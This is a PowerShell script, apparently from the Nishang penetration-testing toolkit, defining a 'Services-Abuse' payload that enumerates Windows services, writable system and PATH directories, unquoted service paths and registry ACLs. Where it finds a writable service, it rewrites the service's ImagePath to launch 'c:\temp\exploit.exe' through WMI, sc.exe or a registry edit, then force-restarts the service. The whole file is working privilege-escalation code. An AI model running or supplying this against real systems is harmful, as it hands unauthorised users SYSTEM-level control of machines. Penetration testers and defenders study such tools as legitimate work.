# Author: Emanuel Bronshtein (@e3amn2l)
function Services-Abuse {
<#
.SYNOPSIS
Nishang Payload which identify several vulnerabilities in windows services and exploit them in order to PE from regular user to more privileged user.

.DESCRIPTION
This payload implement most of the techniques described in MWR paper (see RELATED LINKS)

.EXAMPLE
PS > Services-Abuse

Use above to execute the function.

.LINK
https://labs.mwrinfosecurity.com/system/assets/760/original/Windows_Services_-_All_roads_lead_to_SYSTEM.pdf
https://github.com/samratashok/nishang
#>
    [CmdletBinding()]
    Param ()

	# Global Params for 'can_write_by_acl' function
	$FileSystemFileWrite = 'FullControl', 'Write' , 'WriteData' , 'Modify' , 'AppendData'
	$FileSystemDirWrite = 'FullControl', 'Write' , 'WriteData' , 'Modify'
	#$FileSystemDirWriteAppend = 'FullControl', 'Write' , 'WriteData' , 'Modify' , 'AppendData' , 'CreateFiles'
	$RegistryWrite = 'FullControl' , 'WriteKey', 'SetValue'
	$TakeOwnerShip = 'TakeOwnership'
	$ChangePermissions = 'ChangePermissions'
	
	$CurrentUser = whoami # "$env:userdomain\$env:username"
	$AuthenticatedArray = $CurrentUser , 'Everyone' , 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'
	$CanWriteByACList = @{} # List of can_write_by_acl results on dir\files 

	function can_write_by_acl([string] $obj, [string] $type) { # , [string] $typewrite

		write-host "Check permission(ACL) for: '$obj' type: '$type'"
			
		if($type -eq "file") {
		
			if($CanWriteByACList.containsKey($obj)) {
				return $CanWriteByACList[$obj]
			}
		
			$path_type_found = path_found_type -pathtest $obj
			if($path_type_found -eq $false) { 
				$CanWriteByACList[$obj]=$false
				return $false; 
			}
		
			if($path_type_found -eq "file") { $CheckedArray = $FileSystemFileWrite }
			elseif($path_type_found -eq "dir") { $CheckedArray = $FileSystemDirWrite }
			else {
				write-host "not exists path:" $obj -ForegroundColor Red
				$CanWriteByACList[$obj]=$false
				return $false;
			}
			$Rights = "FileSystemRights"
		}
	
		try {
			$acl = get-acl -Path $obj -ErrorAction "Stop"
		} catch {
			showException -m "Failed to retrieve Access Permissions on: $obj" -e $_

			if($type -eq "file") {$CanWriteByACList[$obj]=$false}
			return $false;
		}
		
		$Return_Status = $false;
		
		#todo: handle owner when needed (no Access rules | rules not enough)
		if($acl.Access -eq $null) {
			# No groups or users have permission to access this object. However, the owner of this object can assign permissions.
			write-host "Empty permissions, Owner:" $acl.Owner
			if($AuthenticatedArray -contains $acl.Owner) {
				write-host $acl.Owner "is the owner of object! (can change permissions)" -ForegroundColor Green
				#todo: change permissions!			
			}
			
			if($type -eq "file") {$CanWriteByACList[$obj]=$Return_Status}
			return $Return_Status
		}
		
		if($type -eq "reg") {
			$Rights = "RegistryRights"
			$CheckedArray = $RegistryWrite
		}
				
		$acl.Access | ForEach-Object {
		
			$perm = $_.$Rights.ToString().Trim()
		
			$accessControl = $_.AccessControlType.ToString().Trim().ToLower()
			$identity = $_.identityReference.Value.Trim()
			
			write-verbose "identity => $identity | permission => $perm | accessControl => $accessControl"
			#todo: take into account deny accesscontrol rules!
			# $accessControl -eq 'Deny' -and 
			if($accessControl -eq 'Allow' -and 
				$AuthenticatedArray -contains $identity) {
				
				$ModifyPerm = $false
				$TakeOwnerShipPerm = $false
				$ChangePermissionsPerm = $false
			
				$permPart = $perm.split(',');
				if($permPart.count -gt 1) {
					foreach($p in $permPart) {
						$pValue = $p.Trim()
						if($CheckedArray -contains $pValue) {
							$ModifyPerm = $true
							break;
						} elseif($pValue -eq $TakeOwnerShip) {
							$TakeOwnerShipPerm = $true
						} elseif($pValue -eq $ChangePermissions) {
							$ChangePermissionsPerm = $true
						}
					}
				} else {
					$ModifyPerm = $CheckedArray -contains $perm
					if($perm -eq $TakeOwnerShip) {
						$TakeOwnerShipPerm = $true
					} elseif($perm -eq $ChangePermissions) {
						$ChangePermissionsPerm = $true
					}
				}
				
				if($ModifyPerm) {
					$Return_Status = $true;
					Write-Host -foregroundColor Green "[se] is writeable by permission: '$perm' to identity: '$identity'"
				} elseif($ChangePermissionsPerm) {
					Write-Host -foregroundColor Green "[se] can change permission by permission: '$perm' to identity: '$identity'"
					#todo: change permissions!
				} elseif($TakeOwnerShipPerm) {
					Write-Host -foregroundColor Green "[se] can take ownership by permission: '$perm' to identity: '$identity'"
					#todo: take ownership!
				}
			}
		}
		
		if($type -eq "file") {$CanWriteByACList[$obj]=$Return_Status}
		return $Return_Status;
	}
	
	$PathFoundTypeList = @{} # List of path_found_type results on dir\files 
	function path_found_type([string] $pathtest) {
	
		if($PathFoundTypeList.containsKey($pathtest)) {
			return $PathFoundTypeList[$pathtest]
		}
	
		try {
			$pathISFile = Test-Path -Path $pathtest -PathType Leaf 		-ErrorAction "Stop"
			$pathISDir  = Test-Path -Path $pathtest -PathType Container -ErrorAction "Stop"
		} catch {
			showException -m "Failed to detect existense of path:'$pathtest'" -e $_
			$PathFoundTypeList[$pathtest]=$false
			return $false;
		}
		
		if($pathISFile) {
			$PathFoundTypeList[$pathtest]="file"
			return "file"
		}
		if($pathISDir) {
			$PathFoundTypeList[$pathtest]="dir"
			return "dir"
		}
		
		$PathFoundTypeList[$pathtest]="n/a"
		return "n/a"
		
	}
	
	# return $true if windows OS is 64bit
	function is64OS() {

		$OSArchitecture = (Get-WMIObject win32_operatingsystem -ErrorAction "SilentlyContinue").OSArchitecture
		if($OSArchitecture -ne $null) {return $OSArchitecture.contains("64");}

		$OSArchitecture = [environment]::Is64BitOperatingSystem
		if($OSArchitecture -ne $null) {return $OSArchitecture;}

		if([System.IntPtr]::Size -eq 8) {
			return $true;
		} else {
			#toimprove: implement CurrentProcessIsWOW64 function http://vincenth.net/blog/archive/2009/11/02/detect-32-or-64-bits-windows-regardless-of-wow64-with-the-powershell-osarchitecture-function.aspx

			if($env:PROCESSOR_ARCHITECTURE.contains("64")) {
				return $true;
			}
			$wow64Arch = $env:PROCESSOR_ARCHITEW6432
			if($wow64Arch -ne $null -and $wow64Arch.contains("64")) {
				return $true;
			}
		}
	}
	
	$WindowsIS64OS = is64OS
	
	function showHashTable($ht) {
		foreach ($h in $ht.GetEnumerator()) {
			Write-Host $h.Name ":" $h.Value
		}
	}
	
	function showException($e , [string] $m) { # error , message
		if($m -ne $null) {
			write-host $m -ForegroundColor Red
		}
		
		write-host "Exception: " $e.Exception.GetType().FullName -ForegroundColor Red
		write-host "Message: "   $e.Exception.Message 			 -ForegroundColor Red
	}

	<#
		1) detect which folders are writable in load library search path:
			The directory from which the application loaded
			The system directory
			The 16-bit system directory
			The Windows directory
			The current working directory (CWD)
			The directories that are listed in the PATH environment variable
		2) detect CWDIllegalInDllSearch settings (affect CWD)
			http://www.greyhathacker.net/?p=235
			https://support.microsoft.com/en-us/kb/2264107
	#>
	
	$SystemRoot = $env:systemroot
	
	function LoadLibrarySearchPathCanWrite() {
	
		# detect if system folders are writable (part of load library search path)
		write-host "Detect possible DLL Hijacking opportunity by writable location in load library search path"
 		write-host "test if has write access to system folders which are part of load library search path"

		$load_lib_search_path = (Join-Path $SystemRoot "System32") , (Join-Path $SystemRoot "System") , $SystemRoot
		[System.Collections.ArrayList]$load_lib_search_path = $load_lib_search_path;

		if($WindowsIS64OS) {
			$load_lib_search_path.Add((Join-Path $SystemRoot "SysWOW64")) | Out-Null
		}
		
		$load_lib_search_path | Foreach-Object {
			can_write_by_acl -obj $_ -type "file" | Out-Null
		}

		# CWD
		
		# get CWDIllegalInDllSearch value from system & programs options

		$CWDIllegalInDllSearchBySystem  = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' -Name CWDIllegalInDllSearch -ErrorAction 'SilentlyContinue').CWDIllegalInDllSearch
		$CWDIllegalInDllSearchPrograms = @{}

		$CWDIllegalInDllSearchAllPrograms = Get-ChildItem -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -ErrorAction 'SilentlyContinue'
		$CWDIllegalInDllSearchAllPrograms | Foreach-Object {
			$CWDIllegalInDllSearchValue = (Get-ItemProperty $_.PsPath -Name CWDIllegalInDllSearch -ErrorAction 'SilentlyContinue').CWDIllegalInDllSearch
			if($CWDIllegalInDllSearchValue -ne $null) {
				$CWDIllegalInDllSearchPrograms[$_.PSChildName] = $CWDIllegalInDllSearchValue
			}
		}
		
		$CWDIllegalInDllSearchProgramsCount = $CWDIllegalInDllSearchPrograms.Count

		write-host "CWDIllegalInDllSearch Values INDEX: 0 => unsafe , 1 & 2 => partial safe , 1107296255 & 283467841535 => safe, other => unsafe" 

		write-host "DLL Hijacking Mitigation Status on System:" $CWDIllegalInDllSearchBySystem
		write-verbose 'from value of HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\CWDIllegalInDllSearch'
		if($CWDIllegalInDllSearchProgramsCount -ge 1) {
			write-host $CWDIllegalInDllSearchProgramsCount "executables contain override settings: "
			write-verbose 'from value of HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<binary file>\CWDIllegalInDllSearch'
			showHashTable($CWDIllegalInDllSearchPrograms)
		}
		
		# System PATH
		
		try {
			$system_path = [environment]::GetEnvironmentVariable("PATH","Machine");
		} catch {
			showException -m "Failed to retrieve SYSTEM PATH environment variable via GetEnvironmentVariable method" -e $_
			
			try {
				$system_path = (Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -ErrorAction 'Stop').'PATH'
			} catch {
				showException -m "Failed to retrieve SYSTEM PATH environment variable via registery entry 'HKLM:\System\CurrentControlSet\Control\Session Manager\Environment'.PATH" -e $_
			}
		}
		
		if($system_path -ne $null) {
			write-host ">>>>> processing system PATH >>>>>"
			ProcessPATH($system_path)
		}
	}
	
	function ProcessPATH([string] $env_path) {
			
		[System.Collections.ArrayList]$pathList = $env_path.Trim().split(';');
		$paths_count = $pathList.count;
	
		# remove empty paths & handle quoted paths that contain semicolons
		
		$removedEmpty = 0;
		$removedInQuote = 0;
		$handle_quoted_path = $false;
		for($i=0; $i -lt $paths_count; $i++)
		{
			$CurrentItemIndex = $i-$removedEmpty-$removedInQuote
			$pathListItem = $pathList[$CurrentItemIndex].Trim()
			if($handle_quoted_path) {
				if($pathListItem.EndsWith('"')) {					
					$pathList[$qindex] = $pathList[$qindex..$CurrentItemIndex] -join ';'
					$pathList.RemoveRange($qindex+1,$CurrentItemIndex-$qindex);
					$removedInQuote+=$CurrentItemIndex-$qindex
					$handle_quoted_path = $false;
				}
			} elseif($pathListItem -eq "") {
				$pathList.RemoveAt($CurrentItemIndex);
				$removedEmpty++;
			} elseif($pathListItem.StartsWith('"') -and !($pathListItem.EndsWith('"'))) {
				$qindex = $CurrentItemIndex
				$handle_quoted_path = $true
			}
		}
				
		Write-Host "Number of paths:" $pathList.count "Removed empty paths:" $removedEmpty

		foreach($path in $pathList) {
			
			write-host "Test PATH:" $path
			
			$path_type_found = path_found_type -pathtest $path
			if($path_type_found -eq $false) { continue; }
						
			if($path_type_found -eq "file") {
				write-host "PATH:" $path "is FILE! (need to be directory)" -ForegroundColor Red
				#todo: try to remove the file & create directory instead
				continue;
			}
			
			if ($path_type_found -eq "dir") {
				can_write_by_acl -obj $path -type "file" | Out-Null		
			} else {
				Write-Host -foregroundColor Cyan "Directory missing!"
				#todo: check if can create it (without creating it)
			}
		}
	}

	function CreateProcessArgumentsParse([string] $argstring) {
		if($argstring.Trim() -eq "") {
			# write-verbose "args are empty!"
			return $false
		}
		
		#todo: identify paths & files in arguments?!
		write-host "args = " $argstring
		
		#todo: improve path regex (need to detect files (abc.dll) & paths (c:\temp , \\host\ , \\?\))
		$PathRegex = '(?:(?:[a-zA-Z]:|\\\\(?:[a-zA-Z0-9_.$-]+|[?.]\\))\\?|\\?)(?:[^\\/:*?"<>|\r\n]+\\)*[^\\/:*?"<>|\r\n]+\.[^.\\/:*?"<>|\r\n]{3}';
		$Res = Select-String $PathRegex -input $argstring -AllMatches
		if($Res -eq $null) {
			write-host "no pathes found in args =" $argstring
		} else {
			$ResCount = $Res.Matches.count
			write-host "[sew] found" $ResCount "Matches for path Regex" -foregroundColor DarkCyan
			
			for($i=0; $i -lt $ResCount; $i++)
			{
				write-host "Match #$i value:" $Res.Matches[$i] -foregroundColor DarkCyan
			}
		}
	}

	function FindParentDirectoryExists([string] $path) {
		$dir = [System.IO.Path]::GetDirectoryName($path);
		#write-host "TEST DIR: $dir"
		
		$path_type_found = path_found_type -pathtest $dir
		if($path_type_found -eq $false) { return $false; }
				
		if($path_type_found -eq "dir") {
			return $dir
		} elseif($path_type_found -eq "file") {
			#todo: somehow hanlde remove of this file if path can be abused!
			write-host "path:" $dir "is FILE! (need to be directory)" -ForegroundColor Red
			
			# | Will be Removed in exploitation phase
		}
		return FindParentDirectoryExists -path $dir
	}
	
	function CreateProcessCommandLineExecutePath([string] $path, [bool] $addexe) {

		if($addexe -eq $true) {$path+='.exe'}
		
		$ext_executable = '.exe' , '.bat' , '.vbs' , '.hta'
		$filext = [System.IO.Path]::GetExtension($path)
		$is_file_executable = $ext_executable -contains $filext
		
		$path_type_found = path_found_type -pathtest $path
		if($path_type_found -eq $false) { return 2; }
		
		if ($path_type_found -eq "dir") {
			write-host "found dir: '$path'"
			return 2;
		}
		
		if($path_type_found -eq "file") {
			write-host "found file: '$path'"
			if($is_file_executable -eq $false) {
				write-host -foregroundColor DarkGray "extension not in executable list: '$filext'"
			}
					
			if(can_write_by_acl -obj $path -type "file") { 
				return 1;
			} else {
				# check directory acl , maybe dll hijacking possibilty. [directory of executable]
				$filedir = [System.IO.Path]::GetDirectoryName($path);
				
				if(can_write_by_acl -obj $filedir -type "file") {
					write-host -foregroundColor DarkGreen "[sep] can write to parent directory of file, possible DLL Hijacking opportunity"
					# $filename = [System.IO.Path]::GetFileName($path)
					# write-host "DLL Hijacking Mitigation on System: " + $CWDIllegalInDllSearchBySystemStatus + " on executable '$filename' " + DllSearchStatus($CWDIllegalInDllSearchPrograms[$filename]) 
				}
							
				return 0;
			}
		
		}
		
		write-host "not-found: '$path'"
		
		if($is_file_executable -eq $true) {
	
			# check directory acl (if can create this file)

			$ParentFolderThatExists = FindParentDirectoryExists -path $path
			if($ParentFolderThatExists -ne $false) {
				if(can_write_by_acl -obj $ParentFolderThatExists -type "file") {
					write-host -foregroundColor Green "[se] can write to parent directory of non-existing file"
					return 1;
				}
			}
		} elseif (![string]::IsNullOrEmpty($filext)) {
			write-host -foregroundColor DarkGray "extension not in executable list: '$filext'"
		}
		
		if($addexe -eq $false) { return CreateProcessCommandLineExecutePath -path $path -addexe $true; }

		return 2;

	}
	
	$accesschk = "d:\temp\accesschk.exe"
	function tool_available([string] $tool, [string] $toolname) {
		$toolexists = $false;
		try {
			$toolexists = Test-Path -Path $tool -PathType Leaf -ErrorAction "Stop"
		} catch {
			showException -m "Failed to detect existense of tool:'$toolname' at: '$tool'" -e $_
			return $false;
		}
		
		if($toolexists -eq $false) {
			write-host "unable to find" $toolname "executable at:" $tool -ForegroundColor Red
		}
		
		return $toolexists;
	}
	
	function accesschk_registery() {
		$toolargs = """-kvuqsw"" ""hklm\System\CurrentControlSet\services"""
		write-host "Check Registery Permissions by accesschk tool:" $accesschk $toolargs
		$ServicesRegACLS = & $accesschk $toolargs
		write_host_lines $ServicesRegACLS
		foreach ($user in $AuthenticatedArray) {
			if($ServicesRegACLS -like "*$user*") {
				write-host "[se]" $user "is found! in subkey of services registery entry" -ForegroundColor Green
			}
		}
	}
	
	function accesschk_services() {
		$toolargs = """-quvcw"" ""*"""
		write-host "Check Services Permissions by accesschk tool:" $accesschk $toolargs
		$ServicesACLs = & $accesschk $toolargs
		write_host_lines $ServicesACLs
		foreach ($user in $AuthenticatedArray) {
			if($ServicesACLs -like "*$user*") {
				write-host "[se]" $user "is found! in one of services" -ForegroundColor Green
			}
		}
	}

	function write_host_lines($Obj) {
		# $String.Trim().Replace("`r","").split("`n")
		$Obj | foreach-object {
			write-host $_
		}
	}
	
	function accesschk_service([string] $ServiceName) {
		$RetStatus = $false
		$toolargs = """-quvcw"" ""$ServiceName"""
		write-host "Check Service:" $ServiceName "Permissions by accesschk tool:" $accesschk $toolargs
		$ServiceACLs = & $accesschk $toolargs
		write_host_lines $ServiceACLs
		foreach ($user in $AuthenticatedArray) {
			if($ServiceACLs -like "*$user*") {
				write-host "[se]" $user "is found! in service:" $ServiceName -ForegroundColor Green
				$RetStatus = $true
			}
		}
		
		return $RetStatus
	}
	
	function service_change_pathname([string] $ServiceName , [string] $pathname) {
 
		try {
			$Ret = Get-WmiObject win32_service -filter "Name='$ServiceName'" -ErrorAction "Stop" | Invoke-WmiMethod -Name Change -ArgumentList @($null,$null,$null,$null,$null,$pathname) -ErrorAction "Stop"
			if($Ret -ne 0) {
				write-host "Failed to change PathName of service: '$ServiceName' errorid: $Ret" -ForegroundColor Red
				return $false
			}
			write-host "changed PathName of service: '$ServiceName' to: '$pathname' using WMI, return status: $Ret" -ForegroundColor Green
		} catch {
			$errmsg='Failed to change PathName of service: '+$ServiceName+' using '
			showException -m $errmsg+"WMI" -e $_ 
			
			#todo: check if " is needed [aka pathname starts with ", but might not end with it. aka escape howto
			$res = & sc.exe config $ServiceName binpath="$pathname"
			write_host_lines $res
			if($res -like "*FAILED*") {
				write-host $errmsg+"SC.EXE" -ForegroundColor Red
				return $false
			} else {
				write-host "changed PathName of service: '$ServiceName' to '$pathname' using sc.exe" -ForegroundColor Green
			}
		}
		
		return ReStartService -ServiceName $ServiceName
	
	}
	
	function PipesACLs() {
		write-host "List of aviable pipes by [System.IO.Directory]::GetFiles('\\.\\pipe\\')"
		$pipes = [System.IO.Directory]::GetFiles('\\.\\pipe\\')
		$pipes
		# write-host "Need to figure out how to receive ACL of pipe"

		$pipesec = "d:\temp\pipesec.exe"
	 	if((tool_available -tool $pipesec -toolname "pipesec") -eq $false) {
			write-host "Download pipesec tool at: http://retired.beyondlogic.org/solutions/pipesec/pipesec.htm"
			return $false;
		}
		
		# spawn a GUI interface for each DACL found
		foreach($p in $pipes) {
			$Res = & $pipesec """$p"""
			write_host_lines $Res
			if($Res -like "*Error 0x*") {
				write-host "Error when retriving information about pipe:" $p -ForegroundColor Red
			} else {
				if($Res -like "*DACL is NULL*") {
					write-host "[se] DACL is NULL!" -ForegroundColor Green
				}
				if($Res -like "*SACL is NULL*") {
					write-host "[se] SACL is NULL!" -ForegroundColor DarkGreen
				}								
			}
		}
		
		$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
		if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
			Write-Warning "pipesec tool requires elevated or administrative privileges on recent Windows versions. Please Re-Run with elevated shell to retrive results!"
		}
		
		<#
		Error 0x2 : The system cannot find the file specified.
		Error 0x5 : Access is denied.
		DACL is NULL. Generating Default Descriptor.
		SACL is NULL. No Auditing currently set on this Object.
		#>
	}

	function ServiceTriggersList([string] $ServiceName) {
		#todo: check if & how can trigger the following events
		write-host "Running SC.EXE qtriggerinfo" $ServiceName "to find out if the service has trigger events"
		$res = & SC.EXE qtriggerinfo $ServiceName
		write_host_lines $res
		if($res -like "*has not registered for any start or stop triggers*") {
			write-host "no triggers found!" -ForegroundColor Red
		} else {
			if($res -like "*START SERVICE*") {
				write-host "[sew] start trigger found!" -ForegroundColor DarkGreen
			}
			if($res -like "*STOP SERVICE*") {
				write-host "[sew] stop trigger found!" -ForegroundColor DarkGreen
			}
		}
	}
	
	function StartService([string] $ServiceName) {
		try {
			Start-Service $ServiceName -ErrorAction 'Stop'
			Write-Host -foregroundColor Green "[se] Service:" $ServiceName "started!"
			return $true
		} catch {
			showException -m "Failed to start service:'$ServiceName'" -e $_ 
			return $false
		}
	}
	
	function ReStartService([string] $ServiceName) {
	
		try {
			$Service = Get-Service $ServiceName -ErrorAction "Stop"
		} catch {
			showException -m "Failed to find service:'$ServiceName'" -e $_ 
			return $false
		}

		write-host "Sevice status:" $Service.Status "CanStop:" $Service.CanStop
		if($Service.Status -eq "Stopped") {
			return StartService($ServiceName)
		} else { #Running
			try {
				Stop-Service $ServiceName -ErrorAction 'Stop'
				Write-Host -foregroundColor Green "[se] Service:" $ServiceName "Stoped!"
			} catch {
				showException -m "Failed to stop service:'$ServiceName'" -e $_ 
			
				#TRY "STOP" BY FORCE KILL THE SERVICE PROCESS
				try{
					$ServicePID = (Get-WmiObject Win32_Service -Filter "Name LIKE '$ServiceName'" -ErrorAction "Stop").ProcessId
				} catch {
					showException -m "Unable to retrive PID of service:'$ServiceName' using WMI" -e $_ 
					$ServicePID = Tasklist.exe /svc /fi "SERVICES eq $ServiceName" /fo csv | convertfrom-csv
					if(!([System.Int32]::TryParse($ServicePID, [ref] 0))) {
						showException -m "Unable to retrive PID of service:'$ServiceName' using Tasklist" -e $_ 
						return $false;
					}
					
					try {
						Stop-Process -Id $ServicePID -Force -ErrorAction "Stop"
					} catch {
						showException -m "Unable to stop PROCESS PID: '$ServicePID' of service:'$ServiceName'" -e $_ 
						return $false;
					}

					return StartService($ServiceName)
				}
			}
		}
	}
	
	
	function CreateProcessCommandLineParse([string] $ExecuteString) {
	
		$pathName = $ExecuteString.Trim()
		if(!($pathName[0] -eq '"')) {
	
			$pathPart = $pathName.split(' ');
			$pathCount = $pathPart.count
	
			write-host "warning potential vulnerable path in: '$ExecuteString'" @{$true="with spaces!";}[$pathCount -gt 1]
			
			for($i=0; $i -lt $pathCount; $i++)
			{
				$pathCheck = $pathPart[0..$i] -join ' '

				$ret = CreateProcessCommandLineExecutePath -path $pathCheck -addexe $false
				if($ret -eq 0 -or $ret -eq 1 ) {
					$argstring = $pathName.substring($pathCheck.length)
					CreateProcessArgumentsParse -args $argstring | Out-Null
					break;
				}
			}
	
		} else {
			$pathPart  = $pathName.split('"');
			$pathCount = $pathPart.count
			$safePath  = $pathPart[1]
			write-host "check existence & override of safe path: '$safePath'| from: '$ExecuteString'"
			CreateProcessCommandLineExecutePath -path $safePath -addexe $false | Out-Null
			
			if($pathCount -gt 1) {
				$argstring = $pathPart[2..$pathCount] -join '"'
				CreateProcessArgumentsParse -args $argstring | Out-Null
			}
		}
	
	}
		
	function RegisteryServicesACL() {
	
		$RegServicesPath = 'HKLM:\System\CurrentControlSet\services'
		try {
			$RegisteryServices = Get-ChildItem $RegServicesPath -ErrorAction "Stop"
		} catch {
			showException -m "Failed to retrieve keys in:'$RegServicesPath' aborting!" -e $_
			ServicesFallBack
			return $false;
		}
		
		$RegisteryServicesCount = $RegisteryServices.Count
		write-host "processing" $RegisteryServicesCount "entries under" $RegServicesPath

		# todo: generate service executable content (generate_payload_exe_service in metasploit) and write it to exe file
		$ServiceExploitPath = "c:\temp\exploit.exe"
		$ServiceExploitPathString = """$ServiceExploitPath"""
		
		foreach($RegService in $RegisteryServices) {
			$RegPSPath = $RegService.PSPath
			$RegServiceName = $RegService.PSChildName

			$ServiceType = (Get-ItemProperty $RegPSPath -Name Type -ErrorAction 'SilentlyContinue').Type
			$ServiceImagePath = (Get-ItemProperty $RegPSPath -Name ImagePath -ErrorAction 'SilentlyContinue').ImagePath
			$ServiceExploitImagePath = "$ServiceExploitPathString $ServiceImagePath"
			write-host "Service: name =" $RegServiceName "type=" $ServiceType "Pathname=" $ServiceImagePath
			
			if($accesschk_available) {
				if(accesschk_service -ServiceName $RegServiceName) {
					service_change_pathname -ServiceName $RegServiceName $ServiceExploitImagePath | Out-Null
				}
			}
			
			if ($ServiceImagePath -ne $null) {
											
				if($ServiceType -ne $null -and $ServiceType -gt 8) { #$ServiceType -ne 1 -and $ServiceType -ne 2
					CreateProcessCommandLineParse -ExecuteString $ServiceImagePath
				} else {
				
					###todo: to check "driver services" [does searching work like unqouted] ###
					# fix imagepath for "driver services" entries?!
					$ServiceImagePathFixed = $true;
					if($ServiceImagePath.startswith('\??\')) {
						$ServiceImagePath = $ServiceImagePath.substring(4)
					} elseif($ServiceImagePath.ToLower().startswith('\systemroot\')) {
						$ServiceImagePath = Join-Path $SystemRoot $ServiceImagePath.substring(12)
					} elseif($ServiceImagePath.ToLower().startswith('system32\')) {
						$ServiceImagePath = Join-Path $SystemRoot $ServiceImagePath
					} else {
						$ServiceImagePathFixed = $false;
					}
					
					if($ServiceImagePathFixed) {
						write-host "Fixed ImagePath:" $ServiceImagePath
					}
					
					# CreateProcessCommandLineParse -ExecuteString $ServiceImagePath
					
					$path_type_found = path_found_type -pathtest $ServiceImagePath
										
					if($path_type_found -eq "file") {
						write-host "PATH:" $ServiceImagePath "is File! Found!"
						can_write_by_acl -obj $ServiceImagePath -type "file" | Out-Null
					} elseif($path_type_found -eq "dir") {
						write-host "PATH:" $ServiceImagePath "is Directory! (need to be file)" -ForegroundColor Red
					} else {
						write-host "PATH:" $ServiceImagePath "not-exists!"
					}
				}
			
			}
			
			if(can_write_by_acl -obj $RegPSPath -type "reg") {
			
				if($ServiceImagePath -ne $null) {
					write-host "ImagePath of '" $RegPSPath "' exists, value is:" $ServiceImagePath
					
					if($ServiceImagePath.StartsWith($ServiceExploitPathString)) {
						write-host "ImagePath startwith exploit path! aborting!"
						continue;
					}
					
					$ServiceStartName = (Get-ItemProperty $RegPSPath -Name ObjectName -ErrorAction 'SilentlyContinue').ObjectName
					$ServiceStartMode = (Get-ItemProperty $RegPSPath -Name Start -ErrorAction 'SilentlyContinue').Start
					<#
						ServiceStartMode values:
						2 = auto
						3 = manual
						4 = disabled
					#>
					$ServiceStartModeDelayed = (Get-ItemProperty $RegPSPath -Name DelayedAutoStart -ErrorAction 'SilentlyContinue').DelayedAutoStart
					# ServiceStartModeDelayed values: 1 = enabled
					if($WindowsIS64OS) {
						$ServiceWOW64 = (Get-ItemProperty $RegPSPath -Name WOW64 -ErrorAction 'SilentlyContinue').WOW64
					}
					Write-Host "Service:" $RegServiceName "StartName:" $ServiceStartName "StartMode:" $ServiceStartMode "StartModeDelayed:" $ServiceStartModeDelayed

					try {
						Set-ItemProperty -Path $RegPSPath -Name ImagePath -Value $ServiceExploitImagePath -ErrorAction "Stop"
						Write-Host -foregroundColor Green "[se] ImagePath of:" $RegPSPath "changed from:" $ServiceImagePath "to:" $ServiceExploitImagePath
					} catch {
						showException -m "Failed to change property ImagePath of:'$RegPSPath'" -e $_ 
						continue;
					}
					
					ReStartService -ServiceName $RegServiceName | Out-Null
				} else {
						write-host "Image property not found, take a look at available properties:"
						
						Get-Item $RegPSPath -ErrorAction 'SilentlyContinue' | Foreach-Object {
							$_.Property | Foreach-Object {
									write-host $_ "=>" (Get-ItemProperty $RegPSPath -Name $_ -ErrorAction 'SilentlyContinue').$_
							}
						}
				}
			}
		}
	}
	
	function ShowDebugACLs() {
		write-host "--------------------------------------------------------"
		write-host "PathFoundTypeList:"
		write-host "--------------------------------------------------------"
		showHashTable($PathFoundTypeList)
		write-host "--------------------------------------------------------"
		write-host "CanWriteByACList:"
		write-host "--------------------------------------------------------"
		showHashTable($CanWriteByACList)
		write-host "--------------------------------------------------------"
	}
	
	function ServicesFallBack() {
	
		write-host "Starting FallBack using accesschk & Get-WmiObject"
		if($accesschk_available) {
			accesschk_registery
		}
		
		try {
			$ServicesWMI = Get-WmiObject -Query "Select * From Win32_Service" -ErrorAction "Stop"
		} catch {
			showException -m "Failed to retrieve services using WMI" -e $_ 
			
			try {
				$Services = Get-Service -ErrorAction "Stop"
			} catch {
				showException -m "Failed to retrieve services using Get-Service" -e $_ 
				write-host "Unable to retrieve services using avialable methods! aborting!" -ForegroundColor Red

				if($accesschk_available) {
					accesschk_services
				}
				
				return $false;
			}
		}
		
		if($ServicesWMI -ne $null) {
			write-host "processing" $ServicesWMI.Count "services using Get-WmiObject"

			foreach($ServiceWMI in $ServicesWMI) {
				$ServiceName 	  = $ServiceWMI.Name
				$ServicePathName  = $ServiceWMI.PathName
				$ServiceState     = $ServiceWMI.State
				$ServiceStartName = $ServiceWMI.StartName
				$ServiceStartMode = $ServiceWMI.StartMode
				write-host "ServiceName  = $ServiceName | ServicePathName = $ServicePathName"
				if($accesschk_available) {
					accesschk_service -ServiceName $ServiceName
				}
				if($ServicePathName -ne $null) {
					CreateProcessCommandLineParse -ExecuteString $ServicePathName
				}
			}
			
		} else {
			write-host "processing" $Services.Count "services using Get-Service"
			
			foreach($Service in $Services) {
				$ServiceName = $Service.Name
				$ServiceState = $Service.Status
				if($accesschk_available) {
					accesschk_service -ServiceName $ServiceName
				}
			}
		}
	}
	
	# start script #
	
	$accesschk_available = tool_available -tool $accesschk -toolname "accesschk"
	if($accesschk_available -eq $false) {
		write-host "Download accesschk tool at: https://technet.microsoft.com/en-gb/sysinternals/bb664922.aspx"
	}

	LoadLibrarySearchPathCanWrite
	write-host "--------------------------------------------------------"
	RegisteryServicesACL
	ShowDebugACLs
	# PipesACLs
}
